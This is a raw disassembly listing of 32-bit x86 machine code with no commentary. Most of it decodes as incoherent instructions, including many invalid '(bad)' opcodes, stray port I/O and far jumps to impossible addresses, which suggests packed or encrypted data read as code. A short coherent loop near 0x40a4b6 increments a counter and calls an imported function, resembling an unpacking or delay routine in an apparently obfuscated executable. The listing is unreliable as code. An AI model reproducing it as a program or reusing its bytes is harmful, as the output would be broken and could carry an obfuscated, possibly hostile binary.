  409fb0:	shl    BYTE PTR [esi+edi*8+0x63],1
  409fb4:	add    BYTE PTR [edx-0x2886f38d],ch
  409fba:	sar    BYTE PTR [ebx-0x29f2e359],0xfa
  409fc1:	pop    es
  409fc2:	ror    dh,cl
  409fc4:	fstp   DWORD PTR [eax+ebp*4+0x12cc44ee]
  409fcb:	jae    0x409f91
  409fcd:	xchg   ebp,eax
  409fce:	ja     0x409f5e
  409fd0:	add    esp,esp
  409fd2:	xor    BYTE PTR [ecx-0x76fd1152],dh
  409fd8:	or     al,0x7b
  409fda:	aam    0x8
  409fdc:	es push esi
  409fde:	in     al,dx
  409fdf:	stos   DWORD PTR es:[edi],eax
  409fe0:	popf   
  409fe1:	sahf   
  409fe2:	fsubp  st(7),st
  409fe4:	push   ss
  409fe5:	adc    ebp,eax
  409fe7:	or     bh,ch
  409fe9:	repnz pop ds
  409feb:	adc    dh,ch
  409fed:	xor    al,0xe5
  409fef:	out    dx,eax
  409ff0:	adc    eax,DWORD PTR [esi-0x63]
  409ff3:	mov    esp,0x67328648
  409ff8:	and    edi,DWORD PTR [eax+0x35]
  409ffb:	or     al,0x3d
  409ffd:	xor    ch,ch
  409fff:	jo     0x409f96
  40a001:	xchg   ebx,eax
  40a002:	sub    ecx,ebx
  40a004:	pop    es
  40a005:	mov    edi,DWORD PTR [ecx*2-0x2356f071]
  40a00c:	or     eax,DWORD PTR ss:[eax]
  40a00f:	push   esp
  40a010:	xor    al,0x4c
  40a012:	inc    ebp
  40a013:	cli    
  40a014:	xor    bl,al
  40a016:	dec    edx
  40a017:	je     0x409fce
  40a019:	mov    dl,0x86
  40a01b:	loopne 0x409ff1
  40a01d:	test   ecx,edx
  40a01f:	in     eax,dx
  40a020:	fldcw  WORD PTR es:[edx]
  40a023:	ror    DWORD PTR [ebp+ecx*1+0x1e],cl
  40a027:	lahf   
  40a028:	ja     0x40a004
  40a02a:	scas   al,BYTE PTR es:[edi]
  40a02b:	fwait
  40a02c:	xchg   BYTE PTR [esi-0xb],cl
  40a02f:	mov    eax,0x144f73aa
  40a034:	push   edi
  40a035:	out    dx,eax
  40a036:	mov    WORD PTR [edi-0x17a27ee2],?
  40a03c:	cmp    esp,ebx
  40a03e:	push   0xfffffffa
  40a040:	pop    edi
  40a041:	aad    0xba
  40a043:	push   0xffffffc8
  40a045:	clc    
  40a046:	xor    BYTE PTR [eax+0x20],bh
  40a049:	rcl    ch,cl
  40a04b:	mov    ebp,0xa82072
  40a050:	jmp    0x40a057
  40a052:	test   BYTE PTR [ebx],dl
  40a054:	sub    ebx,esp
  40a056:	sahf   
  40a057:	sub    dh,dh
  40a059:	repz and BYTE PTR [ebp+0x545f7731],cl
  40a060:	in     al,dx
  40a061:	nop
  40a062:	(bad)  
  40a063:	rcl    edi,cl
  40a065:	push   0x42
  40a067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a068:	inc    ecx
  40a069:	push   cs
  40a06a:	test   BYTE PTR [edx+0x5c],0x54
  40a06e:	dec    edx
  40a06f:	out    0xc1,al
  40a071:	mov    bh,0xf1
  40a073:	scas   eax,DWORD PTR es:[edi]
  40a074:	jl     0x40a09b
  40a076:	clc    
  40a077:	loop   0x40a086
  40a079:	cli    
  40a07a:	(bad)  
  40a07b:	(bad)  
  40a07c:	cmp    BYTE PTR [esi+ebp*4+0x54e19dfc],ah
  40a083:	cmp    DWORD PTR [esi-0x139eaeee],esp
  40a089:	out    dx,eax
  40a08a:	sub    bl,BYTE PTR [edx-0x2a]
  40a08d:	(bad)  
  40a08e:	fs in  eax,dx
  40a090:	push   es
  40a091:	xchg   ebp,eax
  40a092:	mov    dh,0x6d
  40a094:	xor    BYTE PTR [edi+ecx*2-0x13],al
  40a098:	jns    0x40a02e
  40a09a:	cmp    esi,DWORD PTR [ebp-0x2e]
  40a09d:	jae    0x40a0db
  40a09f:	push   ss
  40a0a0:	sub    BYTE PTR [edx],dh
  40a0a2:	pusha  
  40a0a3:	xchg   esi,eax
  40a0a4:	nop
  40a0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a6:	lea    edx,[edi+0x49]
  40a0a9:	or     bl,BYTE PTR [ecx-0x74]
  40a0ac:	pop    ebx
  40a0ad:	(bad)  [ebx-0x782e569b]
  40a0b3:	imul   esi,DWORD PTR [edx+0x32],0xf6d5af17
  40a0ba:	stos   BYTE PTR es:[edi],al
  40a0bb:	imul   esp,DWORD PTR [edi],0xe51e8576
  40a0c1:	xor    ebx,DWORD PTR [edx+0x593ed92f]
  40a0c7:	xlat   BYTE PTR ds:[ebx]
  40a0c8:	mov    BYTE PTR [esp+eax*1],dh
  40a0cb:	sbb    DWORD PTR [esi+0x50],eax
  40a0ce:	fistp  QWORD PTR ds:0x5bed44b6
  40a0d4:	or     eax,0xebe2fc5
  40a0d9:	ins    BYTE PTR es:[edi],dx
  40a0da:	xchg   edi,eax
  40a0db:	lds    edx,FWORD PTR [eax-0x24]
  40a0de:	push   esp
  40a0df:	(bad)  
  40a0e0:	les    ebp,FWORD PTR [ebx-0x2a]
  40a0e3:	inc    ebp
  40a0e4:	mov    ds:0xcf9a1b0,al
  40a0e9:	xor    eax,eax
  40a0eb:	pop    edx
  40a0ec:	test   al,0x2
  40a0ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ef:	outs   dx,DWORD PTR ds:[esi]
  40a0f0:	push   ds
  40a0f1:	in     al,dx
  40a0f2:	repz sub al,0x23
  40a0f5:	rcr    BYTE PTR [ebx-0x1f1a9e81],1
  40a0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0fc:	in     eax,dx
  40a0fd:	xchg   ebp,eax
  40a0fe:	pop    esp
  40a0ff:	call   0xe9f04203
  40a104:	add    ax,0x3ee0
  40a108:	sbb    al,BYTE PTR [ebx+edx*1]
  40a10b:	aad    0x85
  40a10d:	popf   
  40a10e:	mov    cl,0x90
  40a110:	data16 daa 
  40a112:	push   cs
  40a113:	or     eax,0x5c4e6efd
  40a118:	clc    
  40a119:	mov    dh,cl
  40a11b:	mov    DWORD PTR [eax],ebp
  40a11d:	call   0xfafe074e
  40a122:	mov    esi,0xb806bcb2
  40a127:	dec    ecx
  40a128:	call   0x31e7398d
  40a12d:	xchg   edi,eax
  40a12e:	adc    BYTE PTR [ebx-0x6ce0432f],dl
  40a134:	clc    
  40a135:	lahf   
  40a136:	add    ebp,DWORD PTR [edx-0x26459079]
  40a13c:	adc    eax,0x72e703a9
  40a141:	test   esp,esp
  40a143:	(bad)  
  40a144:	mov    cs,WORD PTR [edi-0x48]
  40a147:	dec    eax
  40a148:	ficom  WORD PTR [edx-0x3ffdee19]
  40a14e:	in     al,0x1e
  40a150:	call   0xcf95ff52
  40a155:	stos   DWORD PTR es:[edi],eax
  40a156:	dec    edi
  40a157:	or     al,0xcf
  40a159:	int    0x84
  40a15b:	mov    esi,DWORD PTR [esi]
  40a15d:	add    edx,DWORD PTR [ecx]
  40a15f:	outs   dx,DWORD PTR ds:[esi]
  40a160:	adc    DWORD PTR [ebx],0x4c
  40a163:	in     eax,dx
  40a164:	adc    DWORD PTR [esi+0x48e9c633],ebx
  40a16a:	add    eax,DWORD PTR [eax]
  40a16c:	add    BYTE PTR [ebp+0xa],dl
  40a16f:	loopne 0x40a13d
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	cdq    
  40a17a:	and    eax,DWORD PTR [eax+0x2]
  40a17d:	cmp    edi,esp
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a132
  40a186:	jg     0x40a1dd
  40a188:	aam    0x7
  40a18a:	push   edi
  40a18b:	adc    eax,0x7d0234f2
  40a190:	lods   eax,DWORD PTR ds:[esi]
  40a191:	mov    bh,0xfc
  40a193:	daa    
  40a194:	fstp   QWORD PTR [edi+0x37b8de5d]
  40a19a:	dec    esp
  40a19b:	(bad)  
  40a19c:	out    dx,eax
  40a19d:	jp     0x40a1b2
  40a19f:	sbb    ch,BYTE PTR [ebx-0x41]
  40a1a2:	mov    cl,0x6e
  40a1a4:	push   0x7a
  40a1a6:	sub    DWORD PTR [edi],0x193fa83b
  40a1ac:	mov    dh,0x3a
  40a1ae:	xchg   ecx,eax
  40a1af:	test   DWORD PTR [ebx],esp
  40a1b1:	jnp    0x40a159
  40a1b3:	ins    BYTE PTR es:[edi],dx
  40a1b4:	cli    
  40a1b5:	out    dx,eax
  40a1b6:	icebp  
  40a1b7:	jno    0x40a195
  40a1b9:	jae    0x40a19c
  40a1bb:	push   esp
  40a1bc:	jmp    0x40a1c9
  40a1be:	out    dx,al
  40a1bf:	cli    
  40a1c0:	push   cs
  40a1c1:	pop    edx
  40a1c2:	push   ebp
  40a1c3:	cwde   
  40a1c4:	dec    DWORD PTR [edi+eax*2-0x46]
  40a1c8:	cmp    bh,BYTE PTR [ecx]
  40a1ca:	cs test al,0x29
  40a1cd:	dec    esi
  40a1ce:	stos   DWORD PTR es:[edi],eax
  40a1cf:	push   es
  40a1d0:	pop    ds
  40a1d1:	lods   al,BYTE PTR ds:[esi]
  40a1d2:	pop    ss
  40a1d3:	ss jo  0x40a222
  40a1d6:	inc    esi
  40a1d7:	jp     0x40a1db
  40a1d9:	out    dx,eax
  40a1da:	xchg   DWORD PTR [ecx],esp
  40a1dc:	shl    bl,0x50
  40a1df:	mov    bl,bl
  40a1e1:	adc    dl,BYTE PTR [ecx]
  40a1e3:	or     DWORD PTR [edx+edx*1],0xe9069ee2
  40a1ea:	sub    cl,BYTE PTR [ebx+0x3e]
  40a1ed:	out    0x5,al
  40a1ef:	test   DWORD PTR [ecx],edi
  40a1f1:	pop    ecx
  40a1f2:	and    ch,dh
  40a1f4:	fld    DWORD PTR [ecx*1+0x4f471990]
  40a1fb:	rcr    BYTE PTR [ebx+ecx*1-0x4b],cl
  40a1ff:	les    eax,FWORD PTR ds:0x13816833
  40a205:	daa    
  40a206:	por    mm3,QWORD PTR [ecx]
  40a209:	jecxz  0x40a227
  40a20b:	push   ds
  40a20c:	data16 es ss jp 0x40a256
  40a211:	retf   0x2813
  40a214:	int3   
  40a215:	push   ds
  40a216:	out    dx,al
  40a217:	pop    ss
  40a218:	test   BYTE PTR [edx+edi*1-0x4a],al
  40a21c:	xchg   BYTE PTR [ebx+0x6e],cl
  40a21f:	hlt    
  40a220:	ds out 0x17,al
  40a223:	sbb    esi,DWORD PTR [edi*4+0x76574c26]
  40a22a:	or     eax,0x11ffb0f7
  40a22f:	jp     0x40a288
  40a231:	and    bh,al
  40a233:	pop    ebp
  40a234:	loope  0x40a1ee
  40a236:	sub    dh,BYTE PTR [eax+0x495ad95a]
  40a23c:	mov    ds:0x1bc4b69b,al
  40a241:	inc    ecx
  40a242:	dec    esp
  40a243:	ret    
  40a244:	je     0x40a25c
  40a246:	inc    eax
  40a247:	mov    ds:0x55ac31e2,al
  40a24c:	std    
  40a24d:	push   cs
  40a24e:	(bad)  
  40a250:	in     eax,0xd4
  40a252:	test   ch,cl
  40a254:	mov    eax,ds:0xceee06ef
  40a259:	xchg   edx,eax
  40a25a:	daa    
  40a25b:	cmc    
  40a25c:	jae    0x40a292
  40a25e:	xchg   ebx,eax
  40a25f:	jecxz  0x40a2a2
  40a261:	sub    al,0x53
  40a263:	push   ebx
  40a264:	jbe    0x40a28f
  40a266:	mov    ?,WORD PTR [esp+eax*2+0xc234d70]
  40a26d:	ds in  eax,dx
  40a26f:	adc    eax,0x8df69c68
  40a274:	inc    ebp
  40a275:	sub    al,dh
  40a277:	push   ebx
  40a278:	push   ebp
  40a279:	push   esi
  40a27a:	sbb    eax,0x15bbe712
  40a27f:	jae    0x40a26d
  40a281:	nop
  40a282:	adc    DWORD PTR [ebx],esp
  40a284:	mov    bl,0x92
  40a286:	enter  0x57be,0x18
  40a28a:	daa    
  40a28b:	mov    al,0x0
  40a28d:	pop    edi
  40a28e:	outs   dx,DWORD PTR ds:[esi]
  40a28f:	into   
  40a290:	jmp    0x40a2f9
  40a292:	mov    es,WORD PTR ds:0x889f8a42
  40a298:	arpl   WORD PTR [edx-0x62a2938a],bp
  40a29e:	adc    DWORD PTR [ebx-0x42bd42b],0xfa946f86
  40a2a8:	dec    ecx
  40a2a9:	fnstenv [ebp+0x411857dc]
  40a2af:	retf   0xe512
  40a2b2:	fisubr DWORD PTR [eax-0x2a262c46]
  40a2b8:	out    0x4e,eax
  40a2ba:	lds    ecx,FWORD PTR [eax+0x2f]
  40a2bd:	dec    edi
  40a2be:	mov    ebp,0x4102655f
  40a2c3:	jno    0x40a33b
  40a2c5:	idiv   DWORD PTR [edx]
  40a2c7:	bsr    esp,DWORD PTR [ebp-0x3f8f8de4]
  40a2ce:	sbb    edx,ebp
  40a2d0:	or     DWORD PTR [eax-0x7c],eax
  40a2d3:	lahf   
  40a2d4:	push   eax
  40a2d5:	inc    esi
  40a2d6:	push   es
  40a2d7:	js     0x40a29d
  40a2d9:	sbb    BYTE PTR [ebx-0x4f],bh
  40a2dc:	fimul  WORD PTR [edx]
  40a2de:	xchg   edx,eax
  40a2df:	aas    
  40a2e0:	or     esp,DWORD PTR [ebx]
  40a2e2:	clc    
  40a2e3:	cmp    dh,BYTE PTR [esi-0x54a014ec]
  40a2e9:	(bad)  
  40a2ea:	dec    esi
  40a2eb:	and    BYTE PTR [edi-0x62],0x72
  40a2ef:	loope  0x40a2b6
  40a2f1:	or     al,BYTE PTR [ecx]
  40a2f3:	ds jle 0x40a28e
  40a2f6:	inc    eax
  40a2f7:	repz popa 
  40a2f9:	xchg   ebx,eax
  40a2fa:	arpl   WORD PTR [eax-0x60e38adc],dx
  40a300:	out    0xc2,al
  40a302:	pop    ebx
  40a303:	adc    al,0x24
  40a305:	cmp    eax,0x23bdf0d3
  40a30a:	push   edi
  40a30b:	das    
  40a30c:	leave  
  40a30d:	aam    0xba
  40a30f:	call   0x39a4:0x4318ca7e
  40a316:	data16 cmp ch,BYTE PTR [bp+di]
  40a31a:	sub    bl,ah
  40a31c:	pop    ds
  40a31d:	sub    ch,dl
  40a31f:	xor    al,BYTE PTR [ecx+0x316a1fa7]
  40a325:	(bad)  
  40a326:	in     eax,dx
  40a327:	xchg   ebx,eax
  40a328:	int    0x34
  40a32a:	jle    0x40a336
  40a32c:	and    DWORD PTR [ecx-0x420210bf],ebx
  40a332:	xor    edi,DWORD PTR [ebx-0x55624f9f]
  40a338:	pop    ebx
  40a339:	push   ecx
  40a33a:	mov    BYTE PTR [edx-0x10012363],al
  40a340:	jp     0x40a2dd
  40a342:	sub    DWORD PTR [esi-0x2d],0xffffffee
  40a346:	popa   
  40a347:	mov    ds:0xbd4d693,eax
  40a34c:	bound  esi,QWORD PTR [eax-0x17cc8c9a]
  40a352:	cmc    
  40a353:	into   
  40a354:	ja     0x40a37e
  40a356:	lods   al,BYTE PTR ds:[esi]
  40a357:	jbe    0x40a2e5
  40a359:	cdq    
  40a35a:	jecxz  0x40a3b3
  40a35c:	gs push ss
  40a35e:	shl    DWORD PTR [ebx+0x79],0xfa
  40a362:	aad    0x27
  40a364:	jae    0x40a2e6
  40a366:	mov    edi,0xd42f1719
  40a36b:	or     DWORD PTR [edx+0x2c],esi
  40a36e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a36f:	cmp    edx,eax
  40a371:	fcomp  QWORD PTR [ecx]
  40a373:	outs   dx,DWORD PTR ds:[esi]
  40a374:	(bad)  
  40a375:	sub    dl,BYTE PTR [ecx+ebp*2+0x40]
  40a379:	inc    esi
  40a37a:	jo     0x40a37a
  40a37c:	fimul  WORD PTR [esi+0x375b6af4]
  40a382:	mov    cl,0xcf
  40a384:	ror    BYTE PTR [ebp+edx*2-0x60245e01],1
  40a38b:	or     eax,0xff5f944c
  40a390:	xor    al,0x3
  40a392:	mul    DWORD PTR [edi+0x1c0a7015]
  40a398:	(bad)  
  40a39a:	mov    ecx,0xa52a1039
  40a39f:	dec    esi
  40a3a0:	inc    ebx
  40a3a1:	pop    eax
  40a3a2:	data16 xchg BYTE PTR [ebx+0x4a],cl
  40a3a6:	aam    0xed
  40a3a8:	lods   eax,DWORD PTR ds:[esi]
  40a3aa:	xchg   esi,eax
  40a3ab:	jp     0x40a33c
  40a3ad:	fbld   TBYTE PTR [eax+0xe4aab8e]
  40a3b3:	repz xchg esp,eax
  40a3b5:	sti    
  40a3b6:	mov    ah,0xf0
  40a3b8:	xor    eax,0x45f954a2
  40a3bd:	push   ss
  40a3be:	mov    bh,0x15
  40a3c0:	dec    ebx
  40a3c1:	mov    cl,0xae
  40a3c3:	push   ecx
  40a3c4:	sub    BYTE PTR [esi-0x2c],bl
  40a3c7:	push   ds
  40a3c8:	div    BYTE PTR [esp+eax*8]
  40a3cb:	dec    ebp
  40a3cc:	xchg   ebx,eax
  40a3cd:	or     al,0x78
  40a3cf:	or     eax,0xfdbd558b
  40a3d4:	xchg   BYTE PTR [ebx+0x5c179711],bl
  40a3da:	stc    
  40a3db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3dc:	retf   
  40a3dd:	repz sbb BYTE PTR [esi-0x6d],ah
  40a3e1:	jmp    0x4dbeebaf
  40a3e6:	leave  
  40a3e7:	lods   al,BYTE PTR ds:[esi]
  40a3e8:	cmp    al,0x76
  40a3ea:	mov    ebp,0xb3d10e10
  40a3ef:	push   cs
  40a3f0:	and    al,0x17
  40a3f2:	mov    ds:0x26edac31,al
  40a3f7:	out    dx,eax
  40a3f8:	inc    ecx
  40a3f9:	rcr    BYTE PTR [edx],0x68
  40a3fc:	mov    esi,0xa7a25cd5
  40a401:	dec    edx
  40a402:	loop   0x40a3b0
  40a404:	mov    esp,0xedb7f346
  40a409:	fiadd  DWORD PTR [ecx-0x57]
  40a40c:	(bad)  
  40a40d:	ins    DWORD PTR es:[edi],dx
  40a40e:	int    0x2c
  40a410:	lods   eax,DWORD PTR ds:[esi]
  40a411:	sbb    BYTE PTR [edi+0x197ddc25],cl
  40a417:	sbb    DWORD PTR [ebp-0x53b88265],edx
  40a41d:	or     BYTE PTR [edx],dl
  40a41f:	lock or dl,BYTE PTR [esi-0x45bcae97]
  40a426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a427:	xor    DWORD PTR [ebx+0x15],esi
  40a42a:	lea    edx,[ecx]
  40a42c:	sub    al,0x38
  40a42e:	ins    DWORD PTR es:[edi],dx
  40a42f:	call   0x58c6:0xeb125986
  40a436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a437:	(bad)  
  40a438:	jb     0x40a406
  40a43a:	fbld   TBYTE PTR [edx+0x403b8b58]
  40a440:	mov    ds:0xa75c6804,al
  40a445:	aaa    
  40a446:	inc    ebp
  40a447:	xor    edi,edi
  40a449:	push   ss
  40a44a:	add    BYTE PTR [esi],ch
  40a44c:	daa    
  40a44d:	or     al,0x88
  40a44f:	out    dx,al
  40a450:	dec    esp
  40a451:	add    BYTE PTR [ebp+eax*8-0x4010f811],al
  40a458:	pusha  
  40a459:	hlt    
  40a45a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a45b:	mov    ch,0x8
  40a45d:	call   0x343f0166
  40a462:	std    
  40a463:	jne    0x40a42b
  40a465:	mov    dl,0x7a
  40a467:	enter  0x5975,0x71
  40a46b:	retf   
  40a46c:	out    0xe8,eax
  40a46e:	imul   edx,DWORD PTR [ebp-0xa],0xffffffb2
  40a472:	stos   BYTE PTR es:[edi],al
  40a473:	scas   eax,DWORD PTR es:[edi]
  40a474:	(bad)  
  40a475:	mov    bh,0x58
  40a477:	sub    al,0xd5
  40a479:	and    ah,BYTE PTR [ecx]
  40a47b:	jle    0x40a47b
  40a47d:	jo     0x40a420
  40a47f:	int3   
  40a480:	sbb    eax,0x6a8ae83f
  40a485:	lock mov ds:0x61cb6fd2,eax
  40a48b:	cwde   
  40a48c:	mov    dl,0x74
  40a48e:	add    bl,BYTE PTR [edx+0x217fbbf8]
  40a494:	mov    DWORD PTR [edx+0x177a3fab],esp
  40a49a:	inc    ebx
  40a49b:	in     al,0xb0
  40a49d:	stos   BYTE PTR es:[edi],al
  40a49e:	(bad)  
  40a49f:	pusha  
  40a4a0:	into   
  40a4a1:	and    edx,edi
  40a4a3:	(bad)  
  40a4a4:	sti    
  40a4a5:	jge    0x40a43b
  40a4a7:	gs addr16 push ss
  40a4aa:	or     DWORD PTR [edi+edx*2-0x743d2834],esi
  40a4b1:	std    
  40a4b2:	in     eax,dx
  40a4b3:	pop    ss
  40a4b4:	jg     0x40a4b9
  40a4b6:	mov    DWORD PTR [ecx+0x43047125],0x0
  40a4c0:	add    BYTE PTR [ebx],dh
  40a4c2:	fisttp DWORD PTR [ebx]
  40a4c4:	sbb    eax,0x430471
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x430471,ebx
  40a4d0:	cmp    DWORD PTR ds:0x430471,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42ec3b
  40a4e8:	cmp    DWORD PTR ds:0x430471,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss ret 
  40a512:	rcr    BYTE PTR [edx+0x53],0xe9
  40a516:	loop   0x40a596
  40a518:	jle    0x40a548
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a55d
  40a51e:	popa   
  40a51f:	lock add ebx,DWORD PTR [esi+0x35]
  40a523:	arpl   bp,ax
  40a525:	push   edx
  40a526:	inc    ebx
  40a527:	mov    eax,esi
  40a529:	inc    esp
  40a52a:	ret    
  40a52b:	loope  0x40a4bf
  40a52d:	dec    ebp
  40a52e:	test   ecx,edx
  40a530:	adc    eax,0xdac140a1
  40a535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a536:	mov    esp,0x9141781c
  40a53b:	in     al,dx
  40a53c:	adc    DWORD PTR [edx+0x703e207d],0x68
  40a543:	xchg   ebp,eax
  40a544:	mov    edi,0xb94ffa5d
  40a549:	fsqrt  
  40a54b:	fidivr DWORD PTR cs:[esi+0x552b3d0a]
  40a552:	cmp    al,BYTE PTR [ebx]
  40a554:	in     eax,0xb4
  40a556:	mov    edi,0x86123e2
  40a55b:	mov    bh,0xed
  40a55d:	inc    ebp
  40a55e:	rol    BYTE PTR [ebp-0x736841d4],0xc4
  40a565:	xlat   BYTE PTR ds:[ebx]
  40a566:	mov    ds:0x12743d57,al
  40a56b:	xor    DWORD PTR [eax-0x4d6d1d83],esp
  40a571:	mov    dl,0x5a
  40a573:	das    
  40a574:	ins    DWORD PTR es:[edi],dx
  40a575:	push   0x52
  40a577:	fidiv  DWORD PTR [esi]
  40a579:	xchg   esi,eax
  40a57a:	pop    ss
  40a57b:	pop    ss
  40a57c:	div    DWORD PTR ds:0x635cf154
  40a582:	push   ecx
  40a583:	rcl    ah,cl
  40a585:	repnz adc eax,DWORD PTR ds:0x646bc092
  40a58c:	mov    al,0x90
  40a58e:	icebp  
  40a58f:	movzx  esi,WORD PTR [ebx+0x74]
  40a593:	push   ss
  40a594:	fidiv  DWORD PTR ds:0x2226c523
  40a59a:	adc    DWORD PTR [edx],ecx
  40a59c:	jle    0x40a550
  40a59e:	add    ebx,ebp
  40a5a0:	jecxz  0x40a547
  40a5a2:	jecxz  0x40a581
  40a5a4:	in     al,0x7d
  40a5a6:	xchg   ebp,eax
  40a5a7:	pop    edi
  40a5a8:	jns    0x40a56c
  40a5aa:	xor    DWORD PTR [edx+0x3514d61b],eax
  40a5b0:	rol    BYTE PTR [edi-0x23],1
  40a5b3:	shl    ecx,1
  40a5b5:	and    ch,BYTE PTR [edi-0x76]
  40a5b8:	int3   
  40a5b9:	in     eax,0xf1
  40a5bb:	aad    0xf7
  40a5bd:	stos   BYTE PTR es:[edi],al
  40a5be:	dec    edx
  40a5bf:	add    al,0x39
  40a5c1:	repz or al,BYTE PTR [eax]
  40a5c4:	inc    esi
  40a5c5:	rcr    BYTE PTR [eax-0x33],cl
  40a5c8:	clc    
  40a5c9:	stos   DWORD PTR es:[edi],eax
  40a5ca:	add    ah,BYTE PTR [edx+0x6398c32e]
  40a5d0:	int3   
  40a5d1:	inc    esp
  40a5d2:	mov    es,WORD PTR [ebx]
  40a5d4:	mov    esi,0x889e3987
  40a5d9:	pop    ds
  40a5da:	sub    eax,0xc7481a94
  40a5df:	retf   0xfdcd
  40a5e2:	repnz mov al,ds:0x5dce2824
  40a5e8:	inc    ebx
  40a5e9:	out    dx,al
  40a5ea:	xor    al,0xb5
  40a5ec:	push   0x7d
  40a5ee:	inc    edi
  40a5ef:	cli    
  40a5f0:	test   al,0xad
  40a5f2:	push   ecx
  40a5f3:	inc    edx
  40a5f4:	xor    ah,0x72
  40a5f7:	sar    DWORD PTR [esi],0xa0
  40a5fa:	xchg   ebp,eax
  40a5fb:	js     0x40a5f3
  40a5fd:	push   ss
  40a5fe:	div    BYTE PTR [edx+0x1cf7a6cb]
  40a604:	(bad)  
  40a605:	popa   
  40a606:	jl     0x40a646
  40a608:	(bad)  
  40a609:	loopne 0x40a63f
  40a60b:	das    
  40a60c:	xchg   edi,eax
  40a60d:	jmp    FWORD PTR [esi+0x7ccf44cb]
  40a613:	push   ebp
  40a614:	cmp    DWORD PTR [edx],edi
  40a616:	xor    al,dl
  40a618:	jle    0x40a5ab
  40a61a:	into   
  40a61b:	jg     0x40a68f
  40a61d:	out    dx,al
  40a61e:	xchg   ebp,eax
  40a61f:	ins    BYTE PTR es:[edi],dx
  40a620:	dec    edx
  40a621:	(bad)  
  40a625:	mov    bl,0xf5
  40a627:	push   ebx
  40a628:	(bad)  
  40a629:	lahf   
  40a62a:	pop    esp
  40a62b:	adc    dl,BYTE PTR [ebx]
  40a62d:	(bad)  
  40a62e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40a630:	sub    al,0xba
  40a632:	clc    
  40a633:	das    
  40a634:	stos   BYTE PTR es:[edi],al
  40a635:	jmp    0xcd9c:0x1720664d
  40a63c:	pushf  
  40a63d:	pop    ecx
  40a63e:	arpl   WORD PTR fs:[edi],si
  40a641:	push   cs
  40a642:	ds xchg ebx,eax
  40a644:	test   BYTE PTR [ebx-0x3df37cec],bh
  40a64a:	fdivr  st(7),st
  40a64c:	push   ebx
  40a64d:	aas    
  40a64e:	mov    eax,ds:0x824611d8
  40a653:	push   esi
  40a654:	je     0x40a5f1
  40a656:	jb     0x40a688
  40a658:	pop    ss
  40a659:	mov    bh,BYTE PTR [ecx-0x1db2fee8]
  40a65f:	jae    0x40a6b7
  40a661:	stos   BYTE PTR es:[edi],al
  40a662:	cmp    BYTE PTR [edx+0x64b9ab0e],0xd2
  40a669:	push   0xb7fdbb41
  40a66e:	scas   al,BYTE PTR es:[edi]
  40a66f:	bound  ebx,QWORD PTR [ebp+edx*1+0x708c0366]
  40a676:	or     dh,BYTE PTR [edx+0x5b]
  40a679:	icebp  
  40a67a:	imul   ebp,DWORD PTR [ecx],0xffffffde
  40a67d:	xor    al,0x5
  40a67f:	or     eax,0xd0a3e018
  40a684:	stos   BYTE PTR es:[edi],al
  40a685:	or     dl,BYTE PTR [edx-0x9]
  40a688:	jecxz  0x40a61d
  40a68a:	cmp    ebx,DWORD PTR [edi+0x7d2941d5]
  40a690:	sbb    bh,dl
  40a692:	inc    esp
  40a693:	fs push es
  40a695:	jge    0x40a63c
  40a697:	mov    dl,0xaa
  40a699:	scas   al,BYTE PTR es:[edi]
  40a69a:	push   0x27
  40a69c:	ja     0x40a71c
  40a69e:	aam    0x7a
  40a6a0:	or     edi,DWORD PTR ds:0x90e6bfef
  40a6a6:	push   ebp
  40a6a7:	dec    ebx
  40a6a8:	fadd   QWORD PTR [ebx-0x61398368]
  40a6ae:	addr16 add al,0xf5
  40a6b1:	xchg   edi,eax
  40a6b2:	outs   dx,DWORD PTR ds:[esi]
  40a6b3:	mov    ah,0xc0
  40a6b5:	add    edi,edi
  40a6b7:	fwait
  40a6b8:	rol    DWORD PTR [edi-0x5edb2325],cl
  40a6be:	push   esi
  40a6bf:	mov    ebp,0xaf65f739
  40a6c4:	call   0xc6f727bc
  40a6c9:	mov    ds:0x50759beb,al
  40a6ce:	sti    
  40a6cf:	jp     0x40a686
  40a6d1:	addr16 fs sub bl,ch
  40a6d5:	popf   
  40a6d6:	xchg   DWORD PTR [edx+0x3e563dea],ebp
  40a6dc:	cli    
  40a6dd:	int    0x7b
  40a6df:	sar    DWORD PTR [ecx],0xfb
  40a6e2:	pop    edx
  40a6e3:	call   0x4adf:0x4d211ca4
  40a6ea:	js     0x40a6c1
  40a6ec:	and    bl,cl
  40a6ee:	inc    edi
  40a6ef:	repnz mov bl,0xe4
  40a6f2:	xor    BYTE PTR [ebx-0x73fc4bce],ah
  40a6f8:	mov    ebx,0x60007238
  40a6fd:	mov    WORD PTR [eax+edi*4+0x3b],ss
  40a701:	scas   al,BYTE PTR es:[edi]
  40a702:	mov    edx,0xf938b34d
  40a707:	cmp    BYTE PTR [ecx+0x5c],ch
  40a70a:	pushf  
  40a70b:	xchg   edi,eax
  40a70c:	daa    
  40a70d:	push   0xffffffba
  40a70f:	lahf   
  40a710:	inc    BYTE PTR [edx+0x2b]
  40a713:	ror    BYTE PTR ds:0xabdf3bd0,0xad
  40a71a:	pop    edi
